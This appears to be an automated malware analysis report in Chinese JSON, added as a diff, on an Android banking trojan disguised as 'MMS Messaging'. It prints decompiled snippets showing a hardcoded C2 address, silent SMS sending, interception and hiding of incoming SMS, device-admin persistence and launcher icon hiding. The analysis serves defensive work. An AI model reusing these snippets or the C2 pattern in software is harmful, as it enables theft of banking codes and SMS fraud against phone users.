@@ -1,0 +1,172 @@
+{
+  "APK信息": {
+    "文件名": "8e07510ac0eed8e3534ff485cdb0381970ba2de4bec9f6adca06ec181542d9a0.apk",
+    "sha256": "8e07510ac0eed8e3534ff485cdb0381970ba2de4bec9f6adca06ec181542d9a0",
+    "包名": "exts.denmark",
+    "应用名": "MMS Messaging",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 379.2
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\Constants;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static final String ADMIN_LINK = \"http://193.105.240.158/?action=command\";\npublic static final String INTERCEPTING_ENABLED = \"INTERCEPTING_ENABLED\";\npublic static final String LOCK_ENABLED = \"LOCK_ENABLED\";\npublic static final String CARD_SENT = \"CARD_SENT\";\npublic static final int REQUEST_INTERVAL = 60;",
+          "malicious_code_snippet_context": "  \n  /* JADX INFO: loaded from: classes.dex */\n  public class Constants {\n>>>     public static final String ADMIN_LINK = \"http://193.105.240.158/?action=command\";\n>>>     public static final String APP_ID = \"APP_ID\";\n>>>     public static final String CARD_SENT = \"CARD_SENT\";\n>>>     public static final String INSTALL_ID = \"1\";\n>>>     public static final String INSTALL_SENT = \"INSTALL_SENT\";\n      public static final String INTERCEPTING_ENABLED = \"INTERCEPTING_ENABLED\";\n      public static final String LOCK_ENABLED = \"LOCK_ENABLED\";\n      public static final String PREFS_NAME = \"app_settings\";",
+          "behavior_description": "该Constants类硬编码了C2服务器地址 http://193.105.240.158/?action=command（直接使用裸IP的HTTP地址，action=command表明用于拉取远程指令），并定义REQUEST_INTERVAL=60秒的轮询间隔，恶意软件会每60秒向该C2服务器请求命令实现远程控制。同时INTERCEPTING_ENABLED（短信拦截开关）、LOCK_ENABLED（设备锁定开关）、CARD_SENT（银行卡数据已外传标记）等配置项表明攻击者可通过C2远程开启短信拦截、锁定设备、窃取银行卡凭证，与Mandiant报告所述丹麦overlay银行木马（SlemBunk变种）的包名exts.denmark及行为特征完全吻合。数据流向：本地配置/设备状态 → 定期HTTP轮询硬编码IP的C2服务器（action=command）→ 接收并执行远程指令（拦截短信/锁屏/窃取凭证）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\utils\\Utils;",
+          "method_signature": "for(int i = 0; i < parts.size()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "for(int i = 0; i < parts.size(); ...) { sentIntent.putExtra(\"number\", number); sentIntent.putExtra(\"text\", parts.get(i)); sents.add(PendingIntent.getBroadcast(context, 0, sentIntent, 134217728)); } sms.sendMultipartTextMessage(number, null, parts, sents, null); sms.sendTextMessage(number, null, text, PendingIntent.getBroadcast(context, 0, sentIntent2, 134217728), null);",
+          "malicious_code_snippet_context": "for(int i = 0; i < parts.size(); ...) { sentIntent.putExtra(\"number\", number); sentIntent.putExtra(\"text\", parts.get(i)); sents.add(PendingIntent.getBroadcast(context, 0, sentIntent, 134217728)); } sms.sendMultipartTextMessage(number, null, parts, sents, null); sms.sendTextMessage(number, null, text, PendingIntent.getBroadcast(context, 0, sentIntent2, 134217728), null);",
+          "behavior_description": "该代码位于 exts/denmark/utils/Utils 类中，与 Mandiant 报告中 2016 年在丹麦传播的 Smishing Overlay 银行木马（SlemBunk 同类）高度吻合。代码通过 SmsManager 在无任何用户界面和交互确认的情况下静默发送短信：目标号码(number)与短信内容(text/parts)由方法参数传入（此类木马中通常来自 C2 服务器下发的指令或恶意配置），若内容较长则拆分为多段(parts)并循环构造 PendingIntent 回执后调用 sendMultipartTextMessage() 静默群发，否则直接调用 sendTextMessage() 静默发送单条短信，同时通过 Starter.ACTION_REPORT 广播回执上报发送结果。数据流向：外部可控的号码与短信内容 → SmsManager 静默发送短信。该行为可用于向受害者通讯录联系人传播钓鱼短信实现恶意样本自扩散，或向增值号码发送扣费短信，直接造成用户资费损失。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lexts\\denmark\\MessageReceiver;",
+          "method_signature": "if(needToInterceptIncoming)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\nIntent start = new Intent(context, (Class<?>) SendService.class);\nstart.setAction(SendService.REPORT_INCOMING_MESSAGE);\nstart.putExtra(\"number\", sender);\nstart.putExtra(\"text\", text);\ncontext.startService(start);\nif (needToInterceptIncoming) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "          Map<String, String> messages = retrieveMessages(intent);\n          for (String sender : messages.keySet()) {\n              String text = messages.get(sender);\n>>>             boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\n>>>             Intent start = new Intent(context, (Class<?>) SendService.class);\n>>>             start.setAction(SendService.REPORT_INCOMING_MESSAGE);\n>>>             start.putExtra(\"number\", sender);\n>>>             start.putExtra(\"text\", text);\n>>>             context.startService(start);\n>>>             if (needToInterceptIncoming) {\n>>>                 abortBroadcast();\n>>>             }\n          }\n      }\n  ",
+          "behavior_description": "该 BroadcastReceiver 监听短信广播，从 Intent 的 extras 中解析 PDU 数据提取短信发送方号码和内容，随后通过 startService 启动 SendService 并以 REPORT_INCOMING_MESSAGE 动作将短信内容外传（上报至远端服务器）；同时若配置项 INTERCEPTING_ENABLED 开启，则调用 abortBroadcast() 终止广播，使短信无法到达系统短信应用和用户通知栏，实现短信拦截与隐藏。数据流向：短信 PDU（来源）→ 服务外传 + abortBroadcast() 拦截（危险操作）。该行为可窃取银行验证码/OTP 等敏感短信并隐藏用户感知，符合 SlemBunk/RuMMS 类银行木马的典型短信拦截手法。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "password"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\DevAdminReceiver;",
+          "method_signature": "onPasswordChanged(Context context, Intent intent)",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent startSettings = new Intent(\"android.settings.SETTINGS\");\nstartSettings.addFlags(268435456);\nstartSettings.addFlags(32768);\nstartSettings.addFlags(8388608);\ncontext.startActivity(startSettings);\n...\npublic void onPasswordChanged(Context context, Intent intent) {\n    super.onPasswordChanged(context, intent);\n}\npublic void onPasswordFailed(Context context, Intent intent) {\n    super.onPasswordFailed(context, intent);\n}\npublic void onPasswordSucceeded(Context context, Intent intent) {",
+          "malicious_code_snippet_context": "              startMain.addCategory(\"android.intent.category.HOME\");\n              startMain.setFlags(268435456);\n              context.startActivity(startMain);\n>>>             Intent startSettings = new Intent(\"android.settings.SETTINGS\");\n>>>             startSettings.addFlags(268435456);\n>>>             startSettings.addFlags(32768);\n>>>             startSettings.addFlags(8388608);\n>>>             context.startActivity(startSettings);\n>>>         }\n>>>         super.onReceive(context, intent);\n>>>     }\n>>> \n>>>     @Override // android.app.admin.DeviceAdminReceiver\n>>>     public void onPasswordChanged(Context context, Intent intent) {\n>>>         super.onPasswordChanged(context, intent);\n>>>     }\n  \n      @Override // android.app.admin.DeviceAdminReceiver\n      public void onPasswordFailed(Context context, Intent intent) {",
+          "behavior_description": "DevAdminReceiver 继承 android.app.admin.DeviceAdminReceiver，是 SlemBunk 家族覆盖式银行木马（经丹麦/意大利 Smishing 传播）的设备管理持久化组件。木马通过携带 NEW_TASK/RESET_TASK_IF_NEEDED/EXCLUDE_FROM_RECENTS 标志的 Intent 拉起系统设置页面（android.settings.SETTINGS），诱导用户激活设备管理员权限；激活后木马获得防卸载的持久化能力。onPasswordChanged/onPasswordFailed/onPasswordSucceeded 回调接收系统锁屏密码变更/校验失败/成功广播，用于感知用户锁屏解锁状态与时机，为后续在真实银行应用上弹出覆盖式钓鱼界面的触发提供条件。数据流向：系统密码状态广播→ DeviceAdminReceiver 回调→ 设备管理权限维持与木马持久化，间接支撑凭证钓鱼攻击链。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\Main;",
+          "method_signature": "hide()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "private void hide() {\n    PackageManager packageManager = getPackageManager();\n    ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n    packageManager.setComponentEnabledSetting(componentName, 2, 1);\n}",
+          "malicious_code_snippet_context": "          finish();\n      }\n  \n>>>     private void hide() {\n>>>         PackageManager packageManager = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n>>>         packageManager.setComponentEnabledSetting(componentName, 2, 1);\n>>>     }\n  }",
+          "behavior_description": "hide()方法通过PackageManager.setComponentEnabledSetting()将应用主入口Activity（Main）的组件状态设置为COMPONENT_ENABLED_STATE_DISABLED（值2），并附带DONT_KILL_APP标志（值1）以保证进程不被杀死，从而使应用图标从桌面启动器中消失。数据流向：获取自身主Activity组件名（ComponentName(this, Main.class)）→ 调用setComponentEnabledSetting禁用该组件导致图标隐藏。结合此前已启动的MainService后台服务，恶意程序在隐藏图标后仍持续在后台运行（配合报告所述的银行钓鱼overlay攻击），用户难以发现和卸载，属于SlemBunk/RuMMS类银行木马典型的隐蔽驻留与对抗卸载技术。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
